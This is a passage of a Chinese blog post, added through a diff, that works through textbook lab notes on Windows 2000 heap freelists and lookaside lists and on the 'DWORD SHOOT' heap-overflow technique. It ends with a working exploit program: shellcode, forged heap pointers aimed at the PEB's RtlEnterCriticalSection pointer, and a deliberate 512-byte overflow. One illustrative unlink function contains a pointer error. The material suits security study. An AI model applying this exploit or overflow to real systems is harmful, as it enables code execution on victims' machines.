+<td>h1@00360688</td>
+<td>0x003606A8</td>
+<td>0x00360188</td>
+</tr>
+<tr>
+<td>h3@003606A8</td>
+<td>0x00360188</td>
+<td>0x00360688</td>
+</tr>
+<tr>
+<td>h5@003606C8</td>
+<td>0x00360198</td>
+<td>0x00360198</td>
+</tr>
+<tr>
+<td>Freelist[2]@0x00360188</td>
+<td>0x00360688</td>
+<td>0x003606A8</td>
+</tr>
+<tr>
+<td>Freelist[4]@0x00360198</td>
+<td>0x003606C8</td>
+<td>0x003606C8</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>Freelist表也发生了变化</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919214452673.png" alt="Freelist"></p>
+<blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Freelist[<span class="number">0</span>]@<span class="number">0x00360178</span></span><br><span class="line">Freelist[<span class="number">1</span>]@<span class="number">0x00360180</span></span><br><span class="line">Freelist[<span class="number">2</span>]@<span class="number">0x00360188</span></span><br><span class="line">Freelist[<span class="number">3</span>]@<span class="number">0x00360190</span></span><br><span class="line">Freelist[<span class="number">4</span>]@<span class="number">0x00360198</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>相当于画在下图中的状态</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920080020364.png" alt="image-20220920080020364"></p>
+<h4 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h4><p>前面三个释放,都不是连续的堆地址,现在要再释放h4,他和h3,h5是连续的,又会发生什么呢?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,0,h4); //coalese h3,h4,h5,link the large block to freelist[8]</span><br></pre></td></tr></table></figure>
+
+<p>h4堆块的大小是16字节(8首部+8data),有可能要和已经释放的h1,h3进行合并</p>
+<p>执行后的Freelist</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Freelist[0]@00360178  08 07 36 00 08 07 36 00  6.6.</span><br><span class="line">Freelist[1]@00360180  80 01 36 00 80 01 36 00  €6.€6.</span><br><span class="line">Freelist[2]@00360188  88 06 36 00 88 06 36 00  ?6.?6.</span><br><span class="line">Freelist[3]@00360190  90 01 36 00 90 01 36 00  ?6.?6.</span><br><span class="line">Freelist[4]@00360198  98 01 36 00 98 01 36 00  ?6.?6.</span><br><span class="line">Freelist[5]@003601A0  A0 01 36 00 A0 01 36 00  ?6.?6.</span><br><span class="line">Freelist[6]@003601A8  A8 01 36 00 A8 01 36 00  ?6.?6.</span><br><span class="line">Freelist[7]@003601B0  B0 01 36 00 B0 01 36 00  ?6.?6.</span><br><span class="line">Freelist[8]@003601B8  A8 06 36 00 A8 06 36 00  ?6.?6.</span><br></pre></td></tr></table></figure>
+
+<p>从h1,3,5释放完成后到h4释放完成后,发生变化的Freelist记录有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Freelist[2]@0x00360188</span><br><span class="line">Freelist[4]@0x00360198</span><br><span class="line">Freelist[8]@0x003601B8</span><br></pre></td></tr></table></figure>
+
+<p>可以看出Freelist[2]原来后面挂着两个节点h1@00360688,h3@003606A8,现在只剩下一个h1@0x00360688</p>
+<p>Freelist[4]原来后面挂着h5@003606C8,现在指向自己了,后面啥也没挂</p>
+<p>Freelist[8]后面挂了一个H@0x003606A8</p>
+<p>也就是说消失了h3,h5,还有一个h4,恰好他仨是顺序的,是不是Freelist[8]后面挂着的这个就是呢?去0x003606A0看看这个堆块首部</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">003606A0  08 00 02 00 00 00 0A 00  ......</span><br><span class="line">003606A8  B8 01 36 00 B8 01 36 00  ?6.?6.</span><br></pre></td></tr></table></figure>
+
+
+
+<p>SelfSize&#x3D;0x0008(单位8字节),即64字节</p>
+<p>Flags&#x3D;0,空闲状态</p>
+<p>前指针Freelist[8]@0x3601B8,</p>
+<p>后指针Freelist[8]@0x3601B8</p>
+<p>而h3,4都是8+8&#x3D;16的堆块,h5是8+24&#x3D;32的堆块,合起来正好是64字节</p>
+<p>这证明Freelist[8]上挂着的就是h3,4,5合并起来的堆块</p>
+<h3 id="调试观察快表"><a href="#调试观察快表" class="headerlink" title="调试观察快表"></a>调试观察快表</h3><p>药引子长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>与调试空表时的区别就在HeapCreate函数这里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);<span class="comment">//调试空表时</span></span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//调试快表时</span></span><br></pre></td></tr></table></figure>
+
+<p><code>HeapCreate(0,0,0);</code>这样才能启用快表</p>
+<h4 id="call-HeapCreate"><a href="#call-HeapCreate" class="headerlink" title="call HeapCreate"></a>call HeapCreate</h4><p>调用HeapCreate之后,返回值堆区句柄eax&#x3D;0x360000</p>
+<p>此时的空表Freelist和之前不一样了,Freelist[0]@0x00360178挂着的尾块在0x00361E90了,原来是在0x360688</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920110236696.png" alt="image-20220920110236696"></p>
+<h4 id="从尾块分配"><a href="#从尾块分配" class="headerlink" title="从尾块分配"></a>从尾块分配</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);<span class="comment">//希望从hp堆申请8字节空间,初始化为0</span></span><br></pre></td></tr></table></figure>
+
+<p>这一条执行之后,返回的堆空间句柄eax&#x3D;0x361E90,到这里看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920112928353.png" alt="image-20220920112928353"></p>
+<p>0x361E88开始的八个字节是堆块首</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/head.png" alt="head"></p>
+<p>selfsize&#x3D;0x0002(单位8字节),即堆块首加上data共16字节</p>
+<p>Flag&#x3D;0x01,已占用</p>
+<p>unused bytes&#x3D;8,有8字节尚未使用</p>
+<blockquote>
+<p>此时Freelist[0]指向的尾块也发生了变化</p>
+<p>Freelist[0]@0x00360178</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920122010974.png" alt="image-20220920122010974"></p>
+<p>尾块原来在0x00361E90,现在下移到了0x00361EA0</p>
+</blockquote>
+<p>说明刚才的堆块仍然是从尾块上割出去的</p>
+<p>当四条HeapAlloc都执行完成之后</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br></pre></td></tr></table></figure>
+
+<p>下面就到了HeapFree了,此时就和之前不同了</p>
+<h4 id="但是还给快表"><a href="#但是还给快表" class="headerlink" title="但是还给快表"></a>但是还给快表</h4><p>调试空表时,HeapAlloc申请的空间,使用HeapFree之后会归给还到空表,并且相邻的堆块还会进行合并</p>
+<p>而本次调试,HeapAlloc申请的空间,将会还给快表</p>
+<h5 id="释放h1-1"><a href="#释放h1-1" class="headerlink" title="释放h1"></a>释放h1</h5><p>第一次释放的时h1@0x361E90</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h1);</span><br></pre></td></tr></table></figure>
+
+<p>到0x361E90看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920142559502.png" alt="image-20220920142559502"></p>
+<p>self size&#x3D;0x02,即16字节</p>
+<p>flags&#x3D;0x01,因为快表中的节点都标记为已占用</p>
+<p>unused bytes&#x3D;0x08未使用字节数</p>
+<p>再到快表看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920143027699.png" alt="image-20220920143027699"></p>
+<p>Lookaside[1]@0x3606E8此时其上的指针为0x00361E90,正好就是刚才释放的h1@0x00361E90</p>
+<h5 id="释放h2"><a href="#释放h2" class="headerlink" title="释放h2"></a>释放h2</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h2);</span><br></pre></td></tr></table></figure>
+
+<p>h2和h1一样都是8字节堆首+8字节data,并且两者的地址相邻,释放h2之后会不会发生堆块合并呢?快表没这个能力</p>
+<p>执行之后Lookaside[1]@0x3606E8指向h2@0x361EA0了,原来是指向h1@0x00361E90的</p>
+<p>这就纳闷了,h1@0x00361E90这个堆块目前被谁索引着呢?找不到它不就内存泄漏了吗</p>
+<p>到h2@0x361EA0看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920150733600.png" alt="image-20220920150733600"></p>
+<p>原来是h2指向了h1</p>
+<p>目前快表是这样一个状态</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920151907615.png" alt="image-20220920151907615"></p>
+<p>h1的指针占用了h2data的前4个字节,但是没关系,再申请8字节的堆空间的时候,直接从Lookaside[1]拉的链上把最后面一个摘下来,前面的data就不用存最后这个的指针了</p>
+<h4 id="四次释放完毕后"><a href="#四次释放完毕后" class="headerlink" title="四次释放完毕后"></a>四次释放完毕后</h4><p>将从尾块上割下来的h1,2,3,4都释放了,他们都会挂在lookaside上</p>
+<p>画到图上是这样的</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152300952.png" alt="image-20220920152300952"></p>
+<h4 id="从快表分配"><a href="#从快表分配" class="headerlink" title="从快表分配"></a>从快表分配</h4><p>四次分配释放完成后,实际上干了一个瓜分尾块到快表的事,下面又要进行分配了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br></pre></td></tr></table></figure>
+
+<p>16字节,正好Lookaside[2]上面挂着一个h3@361EB0,这个幸运儿又要得到程序的重用了</p>
+<p>不出所料,调用HeapAlloc函数,返回之后,eax中的句柄值为0x361EB0</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152553906.png" alt="image-20220920152553906"></p>
+<p>到这里去看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152632807.png" alt="image-20220920152632807"></p>
+<p>SelfSize&#x3D;0x0003(单位8字节),即堆块首8字节+data16字节&#x3D;24字节</p>
+<p>flags&#x3D;0x01,占用状态</p>
+<p>再到Lookaside[2]@0x360718看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152821163.png" alt="一夜回到解放前"></p>
+<p>Lookaside[1]@3606E8还有Lookaside[3]@360748都没有发生变化,唯独Lookaside[2]@0x360718一夜回到解放前了</p>
+<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>finally,可以搞点事情了</p>
+<h3 id="DWORD-SHOOT"><a href="#DWORD-SHOOT" class="headerlink" title="DWORD SHOOT"></a>DWORD SHOOT</h3><p>“双字射击”</p>
+<p>构造数据,溢出下一个堆块的块首,改写该堆块中的前向指针flink,后向指针blink,在分配,释放,合并等操作时司机获得一次想内存任意地址写入任意数据的机会</p>
+<p>为啥叫做”DWORD SHOOT”呢?</p>
+<p>“DWORD”是因为攻击负载是一个双字,后面就看到了</p>
+<p>“SHOOT”是因为这种攻击类似于狙击,只有一次机会,不是栈溢出的大水漫灌</p>
+<p><strong>如何发生?</strong></p>
+<p>考虑我们自己写一个双向的链表ADT时,释放其中一个节点应该怎么写?</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920154638925.png" alt="image-20220920154638925"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">	Node *flink;</span><br><span class="line">	Node *blink;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delet</span><span class="params">(Node *node)</span>&#123;</span><br><span class="line">    node-&gt;blink-&gt;flink=node-&gt;flink;<span class="comment">//后节点的前指针指向当前节点的前节点</span></span><br><span class="line">    node-&gt;flink-&gt;blink=node-&gt;flink;<span class="comment">//前节点的后指针指向当前节点的后节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后篡改node节点的前后指针</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920155918456.png" alt="image-20220920155918456"></p>
+<p>然而这都是猜想,windows开发者怎么写的现在我们不知道,下面调试观察是不是这样</p>
+<h3 id="调试分配时DWORD-SHOOT"><a href="#调试分配时DWORD-SHOOT" class="headerlink" title="调试分配时DWORD SHOOT"></a>调试分配时DWORD SHOOT</h3><p>调试程序是这样的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1, h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);<span class="comment">//一开始时申请0x1000个字节的堆空间,最大能够申请0x10000个字节</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);<span class="comment">//希望申请8个字节,实际上从尾块瓜分16字节空间</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);<span class="comment">//连续从尾块上瓜分16*6=96字节空间</span></span><br><span class="line"></span><br><span class="line">	_asm <span class="type">int</span> <span class="number">3</span>	<span class="comment">//used to break the process//在此中断附加调试器</span></span><br><span class="line">	<span class="comment">//free the odd blocks to prevent coalesing</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//释放奇数块,避免合并</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); </span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//now freelist[2] got 3 entries//现在空表freelist[2]后面托着3油瓶</span></span><br><span class="line">    <span class="comment">//后来的直接头插法接到freelist[2]后面,后来的先分配</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//will allocate from freelist[2] which means unlink the last entry (h5)</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>); <span class="comment">//再申请8字节,要把刚才释放的h5要回来</span></span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在win2k上,发行版的程序在INT3之后报错,此时附加od进行调试</p>
+<h4 id="六次HeapAlloc之后"><a href="#六次HeapAlloc之后" class="headerlink" title="六次HeapAlloc之后"></a>六次HeapAlloc之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161251631.png" alt="image-20220920161251631"></p>
+<p>此时程序刚执行了最后一个HeapAlloc,eax中还保存着句柄h6&#x3D;0x5206D8</p>
+<p>可以推测,堆区在0x520000,在内存映射视图中观察,确实如此</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161424952.png" alt="image-20220920161424952"></p>
+<p>6次HeapAlloc都是瓜分的尾块</p>
+<p>尾块现在的位置应该是位于h6的下面</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161542418.png" alt="image-20220920161542418"></p>
+<p>h6块首@0x5206D0</p>
+<p>h6data@0x5206D8</p>
+<p>确实如此,尾块@0x526E8,两个指针都是指向Freelist[0]@0x520178</p>
+<p>尾块首@0x5206E0.</p>
+<h4 id="h1-3-5释放之后"><a href="#h1-3-5释放之后" class="headerlink" title="h1,3,5释放之后"></a>h1,3,5释放之后</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Freelist[0]@00520178  E8 06 52 00 E8 06 52 00  ?R.?R.</span><br><span class="line">Freelist[1]@00520180  80 01 52 00 80 01 52 00  €R.€R.</span><br><span class="line">Freelist[2]@00520188  88 06 52 00 C8 06 52 00  ?R.?R.</span><br><span class="line">Freelist[3]@00520190  90 01 52 00 90 01 52 00  ?R.?R.</span><br><span class="line">Freelist[4]@00520198  98 01 52 00 98 01 52 00  ?R.?R.</span><br><span class="line">Freelist[5]@005201A0  A0 01 52 00 A0 01 52 00  ?R.?R.</span><br></pre></td></tr></table></figure>
+
+<p>其中Freelist[0]两个指针都指向尾块,</p>
+<p>Freelist[2].flink&#x3D;h1@0x00520688</p>
+<p>Freelist[2].blink&#x3D;h5@0x005206C8</p>
+<p>在图上就是这么一个状态</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920162635151.png" alt="image-20220920162635151"></p>
+<h4 id="篡改h5的两个指针"><a href="#篡改h5的两个指针" class="headerlink" title="篡改h5的两个指针"></a>篡改h5的两个指针</h4><p>下一次分配<code>h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); </code>将会把刚才释放的h5@0x005206C8再要回去,</p>
+<p>在要回去之前要修改h3还有Freelist[2]的指针</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920162918303.png" alt="image-20220920162918303"></p>
+<p>在该次分配前,将h5的两个指针先改掉</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163203070.png" alt="修改之前"></p>
+<p>修改之后</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163323743.png" alt="修改之后"></p>
+<p>然后单步步过执行该分配函数,</p>
+<p>此时控制跳转到0x77CCAAD位置,这应该是在HeapAlloc库函数或者其调用函数中了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163836240.png" alt="image-20220920163836240"></p>
+<p>尝试将ecx中的数据写到内存上ds:[EDX],ds即程序数据段选择子,此时ECX和EDX就是我们赋的两个值</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163956631.png" alt="image-20220920163956631"></p>
+<p>ollydbg已经报错</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920163624121.png" alt="寄了"></p>
+<h3 id="利用DWORD-SHOOT"><a href="#利用DWORD-SHOOT" class="headerlink" title="利用DWORD SHOOT"></a>利用DWORD SHOOT</h3><blockquote>
+<p>利用点:</p>
+<p>内存变量</p>
+<p>代码逻辑</p>
+<p>返回地址</p>
+<p>异常处理机制</p>
+<p>函数指针</p>
+<p>PEB线程同步函数入口地址</p>
+</blockquote>
+<p>书上的实验选定受害者是RtlEnterCriticalSection函数指针</p>
+<p>该函数的作用是同步一个进程的不同线程,RtlEnterCriticalSection和RtlCriticalSection函数是访问临界区时需要调用的,保证线程对临界区的访问互斥</p>
+<p>进程退出时,ExitProcess函数会调用这两个临界区函数,但是调用方式是函数指针</p>
+<p>这两个函数指针在PEB+0x20处</p>
+<p>RtlEnterCriticalSection@0x7FFDF020</p>
+<p>RtlLeaveCriticalSection@0x7FFDF024</p>
+<h4 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">&quot;\xB8\x20\xF0\xFD\x7F&quot;</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">&quot;\xBB\x4C\xAA\xF8\x77&quot;</span>  <span class="comment">//MOV EBX,77F82060h the address here may releated to your OS</span></span><br><span class="line"><span class="string">&quot;\x89\x18&quot;</span>				<span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;</span>;</span><br><span class="line"><span class="comment">//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">//used to break the process</span></span><br><span class="line">	<span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>h1向hp堆申请了200字节的空间,但是memcpy中却允许往里放0x200&#x3D;512字节</p>
+<p>而h1后面紧跟着的就是尾块,如果往h1上写入多余200个字节,就把尾块溢出了</p>
+<p>将尾块的首部的指向Freelist[0]的两个指针溢出修改,再发生分配的时候就DWORD SHOOT了</p>
+<p>可以将PEB中的RtlEnterCriticalSection@0x7FFDF020这个指针修改为shellcode</p>
+<p>DWORDSHOOT之后堆异常,程序会调用ExitProcess结束进程</p>
